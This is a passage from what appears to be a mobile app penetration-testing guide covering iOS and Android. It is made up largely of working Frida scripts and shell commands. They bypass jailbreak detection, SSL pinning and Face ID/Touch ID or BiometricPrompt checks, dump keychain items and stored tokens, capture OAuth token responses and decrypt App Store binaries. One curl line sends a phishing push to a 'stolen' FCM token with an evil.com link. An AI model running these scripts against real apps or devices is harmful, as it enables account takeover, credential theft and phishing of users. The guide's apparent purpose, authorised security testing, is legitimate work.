// 2. Hook canOpenURL (cydia:// check)
var canOpenMatches = resolver.enumerateMatches("-[UIApplication canOpenURL:]");
if (canOpenMatches.length > 0) {
    Interceptor.attach(canOpenMatches[0].address, {
        onEnter: function(args) {
            this.url = ObjC.Object(args[2]).toString();
        },
        onLeave: function(retval) {
            if (this.url.indexOf("cydia") !== -1 || this.url.indexOf("sileo") !== -1) {
                console.log("[*] Hiding URL scheme: " + this.url);
                retval.replace(0x0);
            }
        }
    });
}

// 3. Hook fork() to return error
Interceptor.attach(Module.findExportByName(null, "fork"), {
    onLeave: function(retval) {
        console.log("[*] fork() intercepted — returning -1");
        retval.replace(-1);
    }
});

// 4. Hook stat() for path checks
Interceptor.attach(Module.findExportByName(null, "stat"), {
    onEnter: function(args) {
        this.path = args[0].readUtf8String();
    },
    onLeave: function(retval) {
        var hidePaths = ["/bin/bash", "/usr/sbin/sshd", "/Applications/Cydia.app"];
        for (var i = 0; i < hidePaths.length; i++) {
            if (this.path && this.path.indexOf(hidePaths[i]) !== -1) {
                console.log("[*] stat() hiding: " + this.path);
                retval.replace(-1);
            }
        }
    }
});
```

### 5.2 Static Analysis

**class-dump (Objective-C header extraction):**
```bash
# Extract Objective-C class headers from binary
class-dump -H AppBinary -o headers/

# Search for security-relevant classes
find headers/ -name "*.h" | xargs grep -l "Security\|Crypto\|Keychain\|Auth\|Token"

# Modern alternative: dsdump (supports Swift)
dsdump --objc AppBinary > objc_classes.txt
dsdump --swift AppBinary > swift_types.txt
```

**Hopper Disassembler / IDA Pro:**
- Load decrypted Mach-O binary
- Navigate to security-relevant functions
- Identify certificate pinning code (SecTrustEvaluate, URLSession delegate methods)
- Locate jailbreak detection routines
- Trace data flow from user input to sensitive operations
- Identify hardcoded secrets in `__cstring` section

**Mach-O Analysis:**
```bash
# List all segments and sections
otool -l AppBinary | grep -A4 "sectname"

# List linked dynamic libraries
otool -L AppBinary

# Check for PIE (Position Independent Executable)
otool -hv AppBinary | grep PIE

# Check for ARC (Automatic Reference Counting)
otool -Iv AppBinary | grep objc_release

# List Objective-C selectors
otool -v -s __DATA __objc_selrefs AppBinary

# Check encryption status (if still encrypted from App Store)
otool -l AppBinary | grep -A4 "LC_ENCRYPTION_INFO"
# cryptid = 1 means encrypted (must decrypt before analysis)
# cryptid = 0 means decrypted (ready for analysis)
```

### 5.3 Dynamic Analysis

**Frida on iOS:**
```bash
# Install Frida on jailbroken device
# On device: apt install re.frida.server (via Cydia/Sileo)

# Or use frida-gadget for non-jailbroken testing:
# Inject frida-gadget.dylib into IPA, resign, install via sideload

# List processes
frida-ps -U

# Attach to app
frida -U "AppName"

# Spawn with early instrumentation
frida -U -f com.example.app --no-pause -l script.js
```

**Frida Script — Trace Objective-C method calls:**
```javascript
// trace_objc.js
// Trace all methods of a class
var className = "AppAuthManager";
var target = ObjC.classes[className];

if (target) {
    var methods = target.$ownMethods;
    methods.forEach(function(method) {
        var impl = target[method].implementation;
        Interceptor.attach(impl, {
            onEnter: function(args) {
                console.log("[" + className + " " + method + "]");
                // args[0] = self, args[1] = _cmd, args[2+] = method arguments
                if (args.length > 2) {
                    try {
                        console.log("  arg0: " + ObjC.Object(args[2]));
                    } catch(e) {}
                }
            }
        });
    });
    console.log("[+] Hooked " + methods.length + " methods on " + className);
}
```

**Objection on iOS:**
```bash
# Connect to iOS app
objection -g "AppName" explore

# Useful commands:
# Dump keychain
ios keychain dump

# List cookies
ios cookies get

# List plist files
ios plist cat /var/mobile/Containers/Data/Application/<UUID>/Library/Preferences/com.example.app.plist

# Bypass jailbreak detection
ios jailbreak disable

# Bypass SSL pinning
ios sslpinning disable

# Dump classes
ios hooking list classes

# Search for methods
ios hooking search methods "password"

# Dump binary info
ios info binary

# Capture screenshots
ios screenshot
```

**Cycript (legacy but still useful):**
```bash
# Attach to process
cycript -p "AppName"

# Access current view controller
var vc = UIApp.keyWindow.rootViewController

# Dump all subviews
UIApp.keyWindow.recursiveDescription().toString()

# Call private methods
[vc performSelector:@selector(debugDump)]

# Read instance variables
*vc
```

### 5.4 SSL Pinning Bypass

**Frida Universal Pinning Bypass:**
```javascript
// ios_ssl_bypass.js
// Bypass multiple pinning implementations on iOS

// 1. NSURLSession delegate method bypass
var resolver = new ApiResolver("objc");
var didReceiveChallenge = resolver.enumerateMatches(
    "-[* URLSession:didReceiveChallenge:completionHandler:]"
);

didReceiveChallenge.forEach(function(match) {
    Interceptor.attach(match.address, {
        onEnter: function(args) {
            // Get the completionHandler block
            var completionHandler = new ObjC.Block(args[4]);
            
            // Call completion handler with "Use Credential" disposition
            // NSURLSessionAuthChallengeUseCredential = 0
            var credential = ObjC.classes.NSURLCredential.credentialForTrust_(
                ObjC.Object(args[3]).protectionSpace().serverTrust()
            );
            completionHandler.invoke(0, credential);
            console.log("[*] NSURLSession pinning bypassed");
        }
    });
});

// 2. SecTrustEvaluateWithError bypass
var SecTrustEvaluateWithError = Module.findExportByName("Security", "SecTrustEvaluateWithError");
if (SecTrustEvaluateWithError) {
    Interceptor.attach(SecTrustEvaluateWithError, {
        onLeave: function(retval) {
            console.log("[*] SecTrustEvaluateWithError bypassed");
            retval.replace(1); // Return true (trusted)
        }
    });
}

// 3. TrustKit bypass
try {
    var TrustKit = ObjC.classes["TrustKit"];
    if (TrustKit) {
        var pinValidation = resolver.enumerateMatches("-[TSKPinningValidator evaluateTrust:forHostname:]");
        pinValidation.forEach(function(match) {
            Interceptor.attach(match.address, {
                onLeave: function(retval) {
                    console.log("[*] TrustKit pinning bypassed");
                    retval.replace(0); // TSKTrustEvaluationSuccess
                }
            });
        });
    }
} catch(e) {}

// 4. AFNetworking pinning bypass
try {
    var AFPolicy = ObjC.classes["AFSecurityPolicy"];
    if (AFPolicy) {
        AFPolicy["- evaluateServerTrust:forDomain:"].implementation = function(trust, domain) {
            console.log("[*] AFNetworking pinning bypassed for: " + domain);
            return true;
        };
    }
} catch(e) {}

// 5. Alamofire ServerTrustEvaluating bypass
try {
    var matches = resolver.enumerateMatches("-[*ServerTrustEvaluating evaluate*]");
    matches.forEach(function(match) {
        Interceptor.attach(match.address, {
            onLeave: function(retval) {
                console.log("[*] Alamofire pinning bypassed");
                retval.replace(1);
            }
        });
    });
} catch(e) {}
```

**SSL Kill Switch 2 (Cydia tweak):**
- Install via Cydia/Sileo on jailbroken device
- Automatically patches `SecTrustEvaluate`, `NSURLSession` delegates, `CFStream` SSL
- No per-app configuration needed — globally disables pinning
- Limitations: does not handle custom pinning implementations or certificate comparisons in application code

### 5.5 Keychain Dumping

**keychain-dumper:**
```bash
# On jailbroken device
# Build and install keychain-dumper
ldid -S keychain-dumper  # Sign with entitlements
./keychain-dumper

# Output includes:
# - Service name
# - Account
# - Access group
# - Protection class
# - Data (the actual secret)
```

**Frida Keychain Dump:**
```javascript
// keychain_dump.js
var SecItemCopyMatching = Module.findExportByName("Security", "SecItemCopyMatching");

Interceptor.attach(SecItemCopyMatching, {
    onEnter: function(args) {
        var query = ObjC.Object(args[0]);
        console.log("[*] SecItemCopyMatching query: " + query.toString());
    },
    onLeave: function(retval) {
        if (retval.toInt32() === 0) { // errSecSuccess
            console.log("[+] Keychain item found");
        }
    }
});

// Dump all generic passwords
function dumpKeychain() {
    var NSMutableDictionary = ObjC.classes.NSMutableDictionary;
    var query = NSMutableDictionary.alloc().init();
    
    query.setObject_forKey_(ObjC.classes.__NSSingleObjectArrayI.alloc().initWithObject_(
        "genp"), "class"); // kSecClassGenericPassword
    query.setObject_forKey_(true, "r_Attributes"); // kSecReturnAttributes
    query.setObject_forKey_(true, "r_Data");       // kSecReturnData
    query.setObject_forKey_("m_LimitAll", "m_Limit"); // kSecMatchLimitAll
    
    var result = ptr(0);
    var status = SecItemCopyMatching(query.handle, result);
    
    if (status === 0) {
        console.log("[+] Keychain dump: " + ObjC.Object(result).toString());
    }
}
```

### 5.6 IPA Analysis

**Decryption (from App Store encrypted binary):**
```bash
# Method 1: frida-ios-dump (pulls decrypted IPA from device)
python dump.py "AppName"
# Output: AppName.ipa (decrypted, ready for analysis)

# Method 2: CrackerXI+ (Cydia tweak, GUI-based)
# Installs decrypted IPA to /var/mobile/Documents/CrackerXI/

# Method 3: Manual with Frida
# Attach to running app, dump memory regions marked as encrypted
frida -U -f com.example.app -l dump_binary.js
```

**IPA Structure Analysis:**
```bash
# Extract IPA (it's just a ZIP)
unzip AppName.ipa -d extracted/

# Key locations:
# extracted/Payload/App.app/           — App bundle
# extracted/Payload/App.app/Info.plist — Configuration, URL schemes, ATS exceptions
# extracted/Payload/App.app/App       — Main binary (Mach-O)
# extracted/Payload/App.app/*.storyboardc — UI definitions
# extracted/Payload/App.app/Frameworks/ — Embedded frameworks
# extracted/Payload/App.app/embedded.mobileprovision — Provisioning profile

# Decode provisioning profile
security cms -D -i extracted/Payload/App.app/embedded.mobileprovision

# Check entitlements
codesign -d --entitlements - extracted/Payload/App.app/App
```

### 5.7 URL Scheme Hijacking

iOS URL schemes are first-come-first-served — any app can register any scheme:

```bash
# Find registered URL schemes in Info.plist
plutil -convert xml1 Info.plist -o -
# Look for CFBundleURLSchemes

# Attack: Register same URL scheme in malicious app
# If both apps installed, iOS may route to the wrong one
# Particularly dangerous for OAuth callbacks:
#   myapp://oauth/callback?code=AUTHORIZATION_CODE
# Malicious app steals the auth code
```

**Mitigation verification:**
- App should use Universal Links (HTTPS, domain-verified) instead of custom schemes
- If custom schemes must be used, verify the `sourceApplication` in `openURL` delegate

### 5.8 Universal Links Security

Universal Links bind HTTPS URLs to specific apps via Apple App Site Association (AASA):

```json
// https://example.com/.well-known/apple-app-site-association
{
    "applinks": {
        "apps": [],
        "details": [{
            "appID": "TEAMID.com.example.app",
            "paths": ["/auth/*", "/share/*"]
        }]
    }
}
```

**Security testing:**
- Verify AASA is served over HTTPS with valid certificate
- Check if AASA paths are overly broad (e.g., `"paths": ["*"]`)
- Test path manipulation: can you construct a URL that triggers the app but bypasses server-side auth?
- Verify the app validates the incoming Universal Link URL (doesn't blindly trust parameters)

### 5.9 WebView Exploitation (UIWebView / WKWebView)

**UIWebView (deprecated but still found in legacy apps):**
- No process isolation (runs in app process)
- JavaScript can access all app cookies
- Vulnerable to universal XSS if loading untrusted content
- `stringByEvaluatingJavaScriptFromString:` allows native→JS injection

**WKWebView (modern, more secure):**
- Separate process (WebContent process)
- Still vulnerable if misconfigured:
  - `WKUserScript` injection points
  - `WKScriptMessageHandler` bridges (native function exposure to JS)
  - Custom URL scheme handlers (`WKURLSchemeHandler`)

**Frida — Hook WKWebView message handlers:**
```javascript
// wkwebview_hooks.js
var WKWebView = ObjC.classes.WKWebView;

// Hook loadRequest to see what URLs are loaded
Interceptor.attach(WKWebView["- loadRequest:"].implementation, {
    onEnter: function(args) {
        var request = ObjC.Object(args[2]);
        console.log("[WKWebView] Loading: " + request.URL().absoluteString());
    }
});

// Hook evaluateJavaScript to see native→JS calls
Interceptor.attach(WKWebView["- evaluateJavaScript:completionHandler:"].implementation, {
    onEnter: function(args) {
        var js = ObjC.Object(args[2]).toString();
        console.log("[WKWebView] evaluateJavaScript: " + js.substring(0, 200));
    }
});

// Hook WKScriptMessageHandler to intercept JS→Native messages
var resolver = new ApiResolver("objc");
var handlers = resolver.enumerateMatches("-[* userContentController:didReceiveScriptMessage:]");
handlers.forEach(function(match) {
    Interceptor.attach(match.address, {
        onEnter: function(args) {
            var message = ObjC.Object(args[3]);
            console.log("[WKWebView] Message from JS:");
            console.log("  Name: " + message.name());
            console.log("  Body: " + message.body());
        }
    });
});
```

---

## 6. Network Security Testing

### 6.1 Proxy Setup — Burp Suite with Mobile

**Android Proxy Configuration:**
```bash
# Method 1: Wi-Fi proxy settings (non-rooted)
# Settings → Wi-Fi → Long press network → Modify → Advanced → Proxy → Manual
# Host: <Burp machine IP>, Port: 8080

# Method 2: ADB proxy (works for all traffic, not just Wi-Fi)
adb shell settings put global http_proxy <Burp_IP>:8080

# Remove proxy
adb shell settings put global http_proxy :0

# Method 3: iptables redirect (rooted, catches apps that ignore proxy settings)
adb shell su -c "iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination <Burp_IP>:8080"
adb shell su -c "iptables -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination <Burp_IP>:8080"
```

**iOS Proxy Configuration:**
```
Settings → Wi-Fi → (i) on network → Configure Proxy → Manual
Server: <Burp_IP>
Port: 8080
```

**Burp Suite Configuration:**
```
Proxy → Options → Proxy Listeners:
  - Bind to: All interfaces
  - Port: 8080
  - [x] Support invisible proxying (for non-proxy-aware apps)

Project Options → TLS:
  - [x] Use custom protocols: TLSv1.2, TLSv1.3
  - [x] Use custom ciphers (match what mobile apps expect)
```

### 6.2 Certificate Installation and Trust

**Android Certificate Installation:**
```bash
# Export Burp CA certificate (DER format) from Burp → Proxy → Import/export CA certificate

# Convert to PEM
openssl x509 -inform DER -in burp-ca.der -out burp-ca.pem

# For Android 7+ (Nougat): system cert store requires root
# Calculate cert hash for system store filename
HASH=$(openssl x509 -inform PEM -subject_hash_old -in burp-ca.pem | head -1)
cp burp-ca.pem ${HASH}.0

# Push to system cert store (requires root + remounted /system)
adb root
adb remount
adb push ${HASH}.0 /system/etc/security/cacerts/
adb shell chmod 644 /system/etc/security/cacerts/${HASH}.0
adb reboot

# Alternative: Magisk module (MagiskTrustUserCerts)
# Moves user certs to system store on boot without modifying /system
```

**iOS Certificate Installation:**
```bash
# 1. Host certificate on HTTP server
python3 -m http.server 8888

# 2. Navigate to http://<IP>:8888/burp-ca.der on iOS Safari
# 3. Allow profile download
# 4. Settings → General → VPN & Device Management → Install profile
# 5. Settings → General → About → Certificate Trust Settings → Enable for Burp CA
```

### 6.3 Intercepting Certificate-Pinned Traffic

When SSL pinning bypass (Section 3.4 / 5.4) is active, Burp intercepts all HTTPS traffic normally. Additional considerations:

**Handling non-standard TLS:**
```
# If app uses custom TLS port (not 443)
Burp → Proxy → Options → Add listener on that port
# Or use invisible proxy mode + iptables/DNS redirect
```

**Client Certificate Authentication:**
```bash
# Extract client certificate from app
# Android: search /data/data/com.example.app/ for .p12, .pfx, .bks files
adb shell find /data/data/com.example.app -name "*.p12" -o -name "*.bks" -o -name "*.pfx"

# iOS: dump from Keychain (identity items)
# Use keychain-dumper with identity flag

# Import into Burp: Project Options → TLS → Client TLS Certificates
# Add: Destination host, certificate file, password
```

### 6.4 Protocol Analysis Beyond HTTP

**MQTT Interception:**
```bash
# MQTT commonly used in IoT mobile apps
# Use Wireshark with MQTT dissector
# Or use mqtt-proxy for active interception:
pip install mqtt-proxy
mqtt-proxy --listen-port 1883 --target-host real-broker.example.com --target-port 1883

# Redirect app traffic:
# DNS spoofing or hosts file modification to point broker domain to proxy
```

**WebSocket Interception:**
```bash
# Burp Suite handles WebSocket natively since 2020+
# WebSocket messages appear in Proxy → WebSocket history
# Can modify messages in-flight via Intercept

# For standalone WebSocket testing:
pip install websocket-client
python3 -c "
import websocket
ws = websocket.create_connection('ws://target/socket')
ws.send('{\"type\":\"auth\",\"token\":\"stolen_token\"}')
print(ws.recv())
"
```

**Custom TCP/UDP Protocols:**
```bash
# Use Wireshark for packet capture
# On rooted Android:
adb shell tcpdump -i wlan0 -w /sdcard/capture.pcap
adb pull /sdcard/capture.pcap

# On iOS (jailbroken):
ssh root@device tcpdump -i en0 -w /tmp/capture.pcap
scp root@device:/tmp/capture.pcap .

# For active interception of custom protocols:
# Use mitmproxy with custom addon or write a TCP proxy:
# socat -v TCP-LISTEN:9999,fork TCP:real-server:9999
```

**gRPC / Protocol Buffers:**
```bash
# Decode protobuf from captured traffic
# Extract .proto definitions from app binary (often embedded)
strings AppBinary | grep -i "\.proto"

# Use protoc to decode raw bytes
protoc --decode_raw < captured_message.bin

# For active interception: grpcurl or grpc-web-devtools
grpcurl -plaintext -d '{"user_id": "1337"}' target:50051 api.UserService/GetUser
```

### 6.5 VPN Analysis

Mobile apps sometimes use custom VPN configurations:
```bash
# Check for VPN profile (iOS)
# Profiles → VPN payloads show server, protocol, auth method

# Android VpnService detection
grep -r "VpnService\|BIND_VPN_SERVICE" decoded_apk/AndroidManifest.xml

# If app implements VPN, traffic may bypass system proxy
# Solution: intercept at router/gateway level
# Or hook VPN implementation to redirect through Burp
```

### 6.6 Certificate Transparency for Mobile Apps

```bash
# Check if app validates Certificate Transparency (CT) logs
# iOS: ATS enforces CT for some certificate types since iOS 12.1.1
# Android: no default CT enforcement for apps

# Test: Generate cert without CT SCTs, see if app rejects it
# Burp's self-signed cert lacks CT — if app connects after pinning bypass,
# it does NOT enforce CT (common finding)

# CT log checking tools:
# crt.sh — search certificates issued for target domain
curl "https://crt.sh/?q=%.example.com&output=json" | python3 -m json.tool
```

---

## 7. Data Storage Security

### 7.1 Insecure Local Storage

**Android SharedPreferences:**
```bash
# Location: /data/data/com.example.app/shared_prefs/
adb shell cat /data/data/com.example.app/shared_prefs/credentials.xml

# Common findings:
# - Plaintext tokens, passwords, PINs
# - MODE_WORLD_READABLE (deprecated but still found in legacy apps)
# - Sensitive data in clear text (auth tokens, session IDs)
```

**iOS NSUserDefaults:**
```bash
# Location: /var/mobile/Containers/Data/Application/<UUID>/Library/Preferences/
# File: com.example.app.plist

# Read via objection:
ios plist cat /var/mobile/Containers/Data/Application/<UUID>/Library/Preferences/com.example.app.plist

# Or via Frida:
# ObjC.classes.NSUserDefaults.standardUserDefaults().dictionaryRepresentation()
```

**SQLite Databases:**
```bash
# Android:
adb shell find /data/data/com.example.app -name "*.db"
adb pull /data/data/com.example.app/databases/app.db
sqlite3 app.db ".tables"
sqlite3 app.db "SELECT * FROM users;"
sqlite3 app.db "SELECT * FROM tokens;"

# iOS:
find /var/mobile/Containers/Data/Application/<UUID> -name "*.sqlite" -o -name "*.db"
# Copy out and analyze with sqlite3 or DB Browser for SQLite
```

**Realm Databases:**
```bash
# Realm files: *.realm (often unencrypted by default)
# Android: /data/data/com.example.app/files/default.realm
# iOS: <Container>/Documents/default.realm

# Open with Realm Studio or realm-browser
# If encrypted, key may be in SharedPreferences/Keychain or hardcoded in binary
```

### 7.2 File System Analysis

**What data persists where (Android):**
```
/data/data/com.example.app/
├── shared_prefs/        # XML key-value pairs
├── databases/           # SQLite databases
├── files/               # App-created files
├── cache/               # Temporary cache
├── no_backup/           # Files excluded from backup (sensitive)
├── code_cache/          # Optimized DEX files
└── app_webview/         # WebView data (cookies, local storage)

/storage/emulated/0/Android/data/com.example.app/  # External storage (world-readable pre-Q)
```

**What data persists where (iOS):**
```
<Container>/
├── Documents/           # User data, backed up, visible in Files app
├── Library/
│   ├── Preferences/    # NSUserDefaults plists
│   ├── Caches/         # Not backed up, may be purged by OS
│   ├── Cookies/        # WebView cookies
│   ├── WebKit/         # WKWebView persistent storage
│   └── Application Support/ # App support data, backed up
├── tmp/                 # Temporary, purged on reboot
└── SystemData/          # System-managed data
```

### 7.3 Backup Analysis

**Android (ADB Backup):**
```bash
# Create backup (if app allows: android:allowBackup="true")
adb backup -apk -shared com.example.app -f backup.ab

# Convert .ab to .tar
java -jar abe.jar unpack backup.ab backup.tar

# Extract and search for secrets
tar xvf backup.tar
find apps/com.example.app -type f | xargs grep -l "password\|token\|secret\|key"
```

**iOS (iTunes/Finder Backup):**
```bash
# Unencrypted backup location (macOS):
# ~/Library/Application Support/MobileSync/Backup/<UDID>/

# Encrypted backup (password-protected):
# Contains Keychain items (unlike unencrypted)
# Tools: iphone-backup-analyzer, iExplorer, iMazing

# Parse backup manifest
python3 -c "
import plistlib
with open('Manifest.plist', 'rb') as f:
    plist = plistlib.load(f)
    for key in plist:
        print(key, ':', plist[key])
"

# Search for sensitive data in backup files
find . -name "*.plist" | xargs plutil -convert xml1
grep -rn "password\|token\|secret\|apikey" .
```

### 7.4 Clipboard Vulnerability

```javascript
// Frida — Monitor clipboard access (Android)
Java.perform(function() {
    var ClipboardManager = Java.use("android.content.ClipboardManager");
    
    ClipboardManager.setPrimaryClip.implementation = function(clip) {
        var item = clip.getItemAt(0);
        console.log("[CLIPBOARD SET] " + item.getText());
        return this.setPrimaryClip(clip);
    };

    ClipboardManager.getPrimaryClip.implementation = function() {
        var clip = this.getPrimaryClip();
        if (clip !== null && clip.getItemCount() > 0) {
            console.log("[CLIPBOARD READ] " + clip.getItemAt(0).getText());
        }
        return clip;
    };
});
```

```javascript
// Frida — Monitor clipboard (iOS)
var UIPasteboard = ObjC.classes.UIPasteboard;

Interceptor.attach(UIPasteboard["- setString:"].implementation, {
    onEnter: function(args) {
        console.log("[CLIPBOARD SET] " + ObjC.Object(args[2]).toString());
    }
});

Interceptor.attach(UIPasteboard["- string"].implementation, {
    onLeave: function(retval) {
        if (retval !== 0x0) {
            console.log("[CLIPBOARD READ] " + ObjC.Object(retval).toString());
        }
    }
});
```

**Risk:** Any app with clipboard access can read copied passwords, tokens, credit card numbers. iOS 14+ shows notification when app reads clipboard. Android 12+ shows toast notification.

### 7.5 Logging Sensitive Data

**Android (logcat):**
```bash
# Capture all logs from target app
adb logcat --pid=$(adb shell pidof com.example.app) | tee app_logs.txt

# Search for sensitive data in logs
adb logcat -d | grep -i "token\|password\|secret\|bearer\|session\|cookie\|auth"

# Common leak vectors:
# - Log.d("TAG", "User token: " + token)
# - HttpLoggingInterceptor.Level.BODY in production OkHttp
# - Crash report includes request/response bodies
# - Verbose database query logging
```

**iOS (Console.app / os_log):**
```bash
# On macOS, connect device and open Console.app
# Filter by app process name

# On jailbroken device:
# Read syslog
cat /var/log/syslog | grep "AppName"

# Via idevicesyslog (libimobiledevice)
idevicesyslog | grep -i "token\|password\|auth"
```

### 7.6 Screenshot Capture in Multitasking

When an app enters background, iOS/Android capture a screenshot for the app switcher. Sensitive content (banking details, passwords) may be exposed.

**Testing:**
```bash
# Android: screenshots stored in
# /data/system_ce/0/snapshots/<task_id>/
adb shell ls /data/system_ce/0/snapshots/

# iOS: snapshots stored in
# <Container>/Library/SplashBoard/Snapshots/
find /var/mobile/Containers/Data/Application/ -path "*/SplashBoard/Snapshots/*" -name "*.ktx"
```

**Expected Mitigation:**
- Android: `FLAG_SECURE` on window prevents screenshots and screen recording
- iOS: overlay a blank view in `applicationDidEnterBackground:`

### 7.7 Keyboard Cache

**Android:**
```bash
# User dictionary / learned words
adb shell cat /data/data/com.android.providers.userdictionary/databases/user_dict.db

# Keyboard cache (Gboard)
adb shell find /data/data/com.google.android.inputmethod.latin -name "*.db"

# Mitigation: android:inputType="textNoSuggestions|textPassword"
```

**iOS:**
```bash
# Keyboard cache (auto-correct/predictions)
# Location: /var/mobile/Library/Keyboard/
find /var/mobile/Library/Keyboard -name "*.db" -o -name "*.plist"

# Dynamic text cache
# /var/mobile/Library/Keyboard/dynamic-text.dat

# Mitigation: secureTextEntry = true on UITextField
```

---

## 8. Authentication and Session Management

### 8.1 Biometric Bypass Techniques

**Android Biometric Bypass (crypto-based):**
```javascript
// Frida: Bypass BiometricPrompt (event-based, not crypto-based)
Java.perform(function() {
    var BiometricPrompt = Java.use("androidx.biometric.BiometricPrompt");
    var AuthenticationResult = Java.use("androidx.biometric.BiometricPrompt$AuthenticationResult");
    var CryptoObject = Java.use("androidx.biometric.BiometricPrompt$CryptoObject");

    BiometricPrompt.authenticate.overload(
        "androidx.biometric.BiometricPrompt$PromptInfo"
    ).implementation = function(promptInfo) {
        console.log("[*] BiometricPrompt.authenticate() intercepted");
        
        // Invoke the success callback directly
        var callback = this.mAuthenticationCallback.value;
        var result = AuthenticationResult.$new(null); // null CryptoObject
        callback.onAuthenticationSucceeded(result);
    };
});
```

**iOS Face ID / Touch ID Bypass:**
```javascript
// Frida: Bypass LAContext evaluatePolicy
var LAContext = ObjC.classes.LAContext;

Interceptor.attach(LAContext["- evaluatePolicy:localizedReason:reply:"].implementation, {
    onEnter: function(args) {
        // Get the reply block
        var reply = new ObjC.Block(args[4]);
        
        // Call reply with success (true, nil error)
        console.log("[*] Biometric bypass — calling reply(true, nil)");
        reply.invoke(true, NULL);
        
        // Replace implementation to not call original
        this.skip = true;
    }
});
```

**Important Note:** If the app uses *crypto-based* biometric auth (key in Keystore/Secure Enclave unlocked by biometric), simple callback bypass fails. The app needs the actual cryptographic operation result. This is the secure implementation — bypass requires compromising the key material itself.

### 8.2 Token Storage Security

**Insecure patterns (findings during pentest):**
| Storage | Platform | Risk Level | Issue |
|---------|----------|------------|-------|
| SharedPreferences (plaintext) | Android | CRITICAL | Any app with root can read |
| NSUserDefaults | iOS | HIGH | Not encrypted, visible in backups |
| SQLite (unencrypted) | Both | HIGH | Easily extracted |
| Internal storage file | Both | MEDIUM | Requires root/jailbreak to extract |
| Android Keystore | Android | LOW | Hardware-backed, non-exportable |
| iOS Keychain (WhenUnlocked) | iOS | LOW | Hardware-protected, access controlled |

**Frida — Extract tokens from insecure storage:**
```javascript
// Android: dump SharedPreferences
Java.perform(function() {
    var context = Java.use("android.app.ActivityThread").currentApplication().getApplicationContext();
    var prefs = context.getSharedPreferences("auth_prefs", 0);
    var allEntries = prefs.getAll();
    var iterator = allEntries.entrySet().iterator();
    
    while (iterator.hasNext()) {
        var entry = iterator.next();
        console.log("[SharedPrefs] " + entry.getKey() + " = " + entry.getValue());
    }
});
```

### 8.3 OAuth in Mobile — PKCE and Redirect Interception

**PKCE (Proof Key for Code Exchange) — RFC 7636:**
- Mobile apps cannot securely store `client_secret` (binary can be decompiled)
- PKCE replaces client_secret with a dynamically generated code_verifier/code_challenge
- Flow: generate random `code_verifier` → SHA256 → base64url → `code_challenge`
- Authorization request includes `code_challenge`
- Token request includes `code_verifier` (server verifies SHA256 match)

**Custom Scheme Redirect Interception Attack:**
```
1. Legitimate app registers: myapp://oauth/callback
2. Attacker app also registers: myapp://oauth/callback
3. User initiates OAuth → browser → IdP → redirect to myapp://oauth/callback
4. If attacker app handles the redirect → steals authorization code
5. Without PKCE: attacker exchanges code for token
6. With PKCE: attacker cannot exchange code (doesn't know code_verifier)
```

**Testing OAuth Implementation:**
```bash
# Intercept OAuth flow with Burp
# Check for:
# 1. Is PKCE used? (code_challenge in /authorize request)
# 2. Is state parameter present and validated? (CSRF protection)
# 3. Is redirect_uri validated strictly? (no open redirect)
# 4. Is authorization code single-use?
# 5. Are tokens stored securely? (Keystore/Keychain, not SharedPrefs)
# 6. Is refresh token rotation implemented?

# Frida — Capture OAuth tokens
Java.perform(function() {
    // Hook the token response handler
    var OkHttpClient = Java.use("okhttp3.OkHttpClient");
    var Response = Java.use("okhttp3.Response");
    
    Response.body.implementation = function() {
        var body = this.body();
        var url = this.request().url().toString();
        if (url.indexOf("token") !== -1 || url.indexOf("oauth") !== -1) {
            var bodyString = body.string();
            console.log("[OAUTH] " + url);
            console.log("[TOKEN RESPONSE] " + bodyString);
            // Reconstruct body since string() consumes it
            var MediaType = Java.use("okhttp3.MediaType");
            var ResponseBody = Java.use("okhttp3.ResponseBody");
            return ResponseBody.create(MediaType.parse("application/json"), bodyString);
        }
        return body;
    };
});
```

### 8.4 Push Notification Security

```bash
# Risks:
# 1. Push token stored insecurely (allows impersonation)
# 2. Sensitive data in notification payload (visible on lock screen)
# 3. Silent push used for tracking
# 4. Push server endpoint lacks authentication

# Test: Capture push token registration
# Android: hook FirebaseMessaging.onNewToken()
# iOS: hook application:didRegisterForRemoteNotificationsWithDeviceToken:

# Attempt to send push to stolen token:
curl -X POST https://fcm.googleapis.com/fcm/send \
  -H "Authorization: key=<SERVER_KEY_FROM_APP_BINARY>" \
  -H "Content-Type: application/json" \
  -d '{
    "to": "<STOLEN_FCM_TOKEN>",
    "notification": {"title": "Phishing", "body": "Click here to verify"},
    "data": {"url": "https://evil.com/phish"}
  }'
```

### 8.5 Deep Link Authentication Bypass

```bash
# Many apps use deep links for "magic link" authentication:
# myapp://auth/verify?token=MAGIC_TOKEN

# Attack vectors:
# 1. Token brute force (if short or predictable)
# 2. Token reuse (if not single-use)
# 3. Token lifetime (if not time-bounded)
# 4. Link interception (custom scheme hijacking)
# 5. Token leakage via referrer header (if web-based fallback)

# Test with adb:
adb shell am start -a android.intent.action.VIEW \
  -d "myapp://auth/verify?token=test123&redirect=https://evil.com"
```

### 8.6 Session Fixation in Mobile

```bash
# Test for session fixation:
# 1. Obtain session token before authentication
# 2. Authenticate using that session
# 3. Check if session token changes after login
# 4. If NOT — session fixation vulnerability

# Mobile-specific concerns:
# - Device token binding (is session tied to device?)
# - Certificate pinning bypassed → attacker can observe + fixate session
# - Background token refresh not invalidating old tokens
```

### 8.7 Device Binding Mechanisms

**Android Device Attestation:**
```java
// Key attestation: proves key was generated in hardware on specific device
KeyGenParameterSpec spec = new KeyGenParameterSpec.Builder("device_key", PURPOSE_SIGN)
    .setAttestationChallenge(serverNonce)  // Server provides challenge
    .setDigests(KeyProperties.DIGEST_SHA256)
    .build();

// Attestation certificate chain → send to server
// Server verifies: chain roots to Google, extension contains device properties
// Properties: OS version, patch level, boot state, device lock status
```

**iOS Device Check / App Attest:**
```swift
// App Attest (iOS 14+): hardware-backed attestation
import DeviceCheck

let service = DCAppAttestService.shared
service.generateKey { keyId, error in
    // keyId bound to device + app + development team
    service.attestKey(keyId!, clientDataHash: serverChallenge) { attestation, error in
        // Send attestation to server for verification
        // Server validates with Apple's attestation service
    }
}
```

---

## 9. Reverse Engineering Mobile Apps

### 9.1 Decompiling to Source-Equivalent Code

**Android (Java/Kotlin):**
```bash
# Best results: jadx (handles most obfuscation)
jadx --show-bad-code -d output/ target.apk
# --show-bad-code: shows decompiled output even when imperfect

# For specific classes of interest:
jadx --class "com.example.app.security.*" -d output/ target.apk

# Alternative: procyon (better for complex control flow)
java -jar procyon-decompiler.jar -o output/ classes.dex

# Kotlin-specific: kotlinc metadata is often preserved
# Look for @Metadata annotation in decompiled classes
